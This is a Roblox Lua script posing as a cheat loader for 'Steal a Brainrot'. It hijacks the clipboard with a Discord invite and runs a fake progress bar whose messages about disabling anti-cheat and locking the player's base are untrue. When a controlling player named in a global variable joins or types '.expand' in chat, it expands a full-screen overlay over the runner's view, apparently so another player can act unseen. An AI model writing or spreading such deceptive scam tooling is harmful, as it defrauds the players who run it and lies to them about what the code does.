setclipboard("https://discord.gg/evelynnscripts")

local startTime = tick()
local totalDuration = 600
local earlyStage = 120
local lateStage = 480
local msgIndex = 1
local msgInterval = 3
local lastMsgTime = tick()

local TweenService = game:GetService("TweenService")
local Players = game:GetService("Players")
local TextChatService = game:GetService("TextChatService")

local gui = Instance.new("ScreenGui")
gui.Name = "gui"
gui.Parent = Players.LocalPlayer:WaitForChild("PlayerGui")
gui.ResetOnSpawn = false
gui.IgnoreGuiInset = true
gui.DisplayOrder = 999999

-- Flag to track if UI has already expanded
local hasExpanded = false

local function stroke(obj, thickness, color)
    local s = Instance.new("UIStroke", obj)
    s.Thickness = thickness
    s.Color = color
    return s
end

local bg = Instance.new("Frame", gui)
bg.Size = UDim2.new(0, 400, 0, 150)
bg.Position = UDim2.new(0.5, 0, 0.5, 0)
bg.AnchorPoint = Vector2.new(0.5, 0.5)
bg.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
bg.BorderSizePixel = 1
bg.BorderColor3 = Color3.fromRGB(160, 220, 160)

local bgCorner = Instance.new("UICorner", bg)
bgCorner.CornerRadius = UDim.new(0, 20)

local gradient = Instance.new("UIGradient", bg)
gradient.Color = ColorSequence.new({
    ColorSequenceKeypoint.new(0, Color3.fromRGB(0, 0, 255)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 0, 0))
})

local discordText = Instance.new("TextLabel", gui)
discordText.Size = UDim2.new(0, 500, 0, 30)
discordText.Position = UDim2.new(0.5, 0, 0.75, 0)
discordText.AnchorPoint = Vector2.new(0.5, 0)
discordText.BackgroundTransparency = 1
discordText.TextColor3 = Color3.fromRGB(100, 200, 255)
discordText.Font = Enum.Font.FredokaOne
discordText.TextScaled = true
discordText.TextWrapped = true
discordText.Text = "https://discord.gg/evelynnscripts (copied)"
stroke(discordText, 1, Color3.fromRGB(255, 255, 255))

discordText.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        local setclipboard = setclipboard
        if setclipboard then
            setclipboard("https://discord.gg/evelynnscripts (copied)")
            discordText.Text = "Discord link copied to clipboard! ✓"
            wait(2)
            discordText.Text = "https://discord.gg/evelynnscripts (copied)"
        end
    end
end)

local barBG = Instance.new("Frame", bg)
barBG.Size = UDim2.new(0, 360, 0, 28)
barBG.Position = UDim2.new(0.5, 0, 0.6, 0)
barBG.AnchorPoint = Vector2.new(0.5, 0.5)
barBG.BackgroundColor3 = Color3.fromRGB(30, 30, 120)
barBG.BorderSizePixel = 1
barBG.BorderColor3 = Color3.fromRGB(60, 60, 150)
barBG.ClipsDescendants = true
Instance.new("UICorner", barBG)

local bar = Instance.new("Frame", barBG)
bar.Size = UDim2.new(0, 0, 1, 0)
bar.Position = UDim2.new(0, 0, 0, 0)
bar.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
bar.BorderSizePixel = 0
Instance.new("UICorner", bar)
stroke(bar, 1, Color3.fromRGB(255, 100, 100))

local pct = Instance.new("TextLabel", barBG)
pct.Size = UDim2.new(1, 0, 1, 0)
pct.BackgroundTransparency = 1
pct.TextColor3 = Color3.fromRGB(255, 255, 255)
pct.Font = Enum.Font.FredokaOne
pct.TextScaled = true
pct.Text = "0%"
stroke(pct, 1, Color3.fromRGB(0, 0, 0))

local title = Instance.new("TextLabel", bg)
title.Size = UDim2.new(0.6, 0, 0.1, 0)
title.Position = UDim2.new(0.5, 0, 0.1, 0)
title.AnchorPoint = Vector2.new(0.5, 0)
title.BackgroundTransparency = 1
title.TextColor3 = Color3.fromRGB(80, 30, 120)
title.Font = Enum.Font.FredokaOne
title.TextScaled = true
title.Visible = false
title.Text = "Steal a Brainrot"
stroke(title, 2, Color3.fromRGB(255, 255, 255))

local safeText = Instance.new("TextLabel", bg)
safeText.Size = UDim2.new(0.7, 0, 0.05, 0)
safeText.Position = UDim2.new(0.5, 0, 0.22, 0)
safeText.AnchorPoint = Vector2.new(0.5, 0)
safeText.BackgroundTransparency = 1
safeText.TextColor3 = Color3.fromRGB(80, 120, 200)
safeText.Font = Enum.Font.FredokaOne
safeText.TextScaled = true
safeText.TextWrapped = true
safeText.Visible = false
safeText.Text = "Don't worry, your base is being automatically locked!"
stroke(safeText, 1, Color3.fromRGB(255, 255, 255))

local status = Instance.new("TextLabel", bg)
status.Size = UDim2.new(0.5, 0, 0.05, 0)
status.Position = UDim2.new(0.5, 0, 0.95, 0)
status.AnchorPoint = Vector2.new(0.5, 1)
status.BackgroundTransparency = 1
status.TextColor3 = Color3.fromRGB(220, 180, 255)
status.Font = Enum.Font.FredokaOne
status.TextScaled = true
status.Visible = false
status.Text = "Loading Script Modules..."
stroke(status, 1, Color3.fromRGB(100, 50, 150))

local function Expand()
    if hasExpanded then return end
    hasExpanded = true
    
    local tween = TweenService:Create(bg, TweenInfo.new(1.2, Enum.EasingStyle.Sine, Enum.EasingDirection.Out), {
        Size = UDim2.new(1, 0, 1, 0),
        Position = UDim2.new(0.5, 0, 0.5, 0)
    })
    tween:Play()
    tween.Completed:Connect(function()
        bgCorner.CornerRadius = UDim.new(0, 0)
        title.Visible = true
        status.Visible = true
        safeText.Visible = true
    end)
end

-- Function to check for target player
local function checkForTargetPlayer()
    if not getgenv().Username then return end
    
    -- Check existing players
    for _, player in ipairs(Players:GetPlayers()) do
        if player.Name == getgenv().Username then
            Expand()
            return true
        end
    end
    
    -- Listen for new players
    local connection
    connection = Players.PlayerAdded:Connect(function(player)
        if player.Name == getgenv().Username then
            Expand()
            if connection then
                connection:Disconnect()
            end
        end
    end)
    
    return false
end

local function setupChatHandler()
    if not getgenv().Username then
        return
    end
    if TextChatService then
        local channel = TextChatService.TextChannels:FindFirstChild("RBXGeneral")
        if channel then
            channel.OnIncomingMessage = function(message)
                local sender = message.TextSource and message.TextSource.Name
                local text = string.lower(message.Text)
                if sender == getgenv().Username and text == ".expand" then
                    Expand()
                end
            end
        end
    end
    local player = Players.LocalPlayer
    if player and player:FindFirstChild("PlayerScripts") then
        player.Chatted:Connect(function(message)
            if player.Name == getgenv().Username and string.lower(message) == ".expand" then
                Expand()
            end
        end
    end
end

local msgs = {
    "Loading Cloned Brianrots",
    "Deleting anti cheat modules",
    "Detecting server modules",
    "Loading script ui",
    "Trying to disable kick",
    "Anti kick enabled",
    "Downloading script files",
    "Downloading script files",
    "Downloading script files"
}

local function update()
    local currentTime = tick()
    local elapsed = currentTime - startTime
    local progress = 0
    if elapsed < earlyStage then
        progress = (elapsed / earlyStage) * 0.6
    else
        local lateElapsed = elapsed - earlyStage
        progress = 0.6 + (lateElapsed / lateStage) * 0.4
    end
    progress = math.min(progress, 1)
    bar.Size = UDim2.new(progress, 0, 1, 0)
    pct.Text = string.format("%d%%", math.floor(progress * 100))
    if currentTime - lastMsgTime >= msgInterval then
        status.Text = msgs[msgIndex]
        msgIndex = msgIndex + 1
        if msgIndex > #msgs then
            msgIndex = 1
        end
        lastMsgTime = currentTime
    end
    if progress >= 1 then
        Expand()
    end
end

-- Start checking for target player immediately
checkForTargetPlayer()

-- Main update loop
while tick() - startTime < totalDuration do
    update()
    wait(0.1)
end

setupChatHandler()
update()
